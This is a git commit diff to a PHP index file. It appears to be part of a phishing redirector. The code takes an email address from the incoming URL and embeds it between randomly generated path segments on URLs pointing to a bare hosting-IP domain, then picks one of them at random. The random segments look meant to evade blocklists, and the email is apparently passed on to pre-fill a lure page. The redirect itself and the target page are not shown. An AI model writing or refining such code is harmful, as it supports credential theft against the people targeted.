7c9dedbe0a7faebf34e246979ac8a8144145ad5c
anumumadavum38-ops <anumumadavum38@gmail.com>
2026-04-28 15:12:37 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,14 +1,23 @@
 <?php
+// Pega o email da URL de entrada
+$requestUri = $_SERVER['REQUEST_URI'];
+$email = '';
+
+if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
+    $email = $matches[1];
+}
+
 $baseUrl = 'https://1.190.153.160.host.secureserver.net/';
 
 function generateSegment($length) {
-  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
+    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
 }
 
+// Monta as URLs com o email embutido no meio dos segmentos randômicos
 $urls = [
-  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
-  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
+    $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
 ];
 
 $randomUrl = $urls[array_rand($urls)];
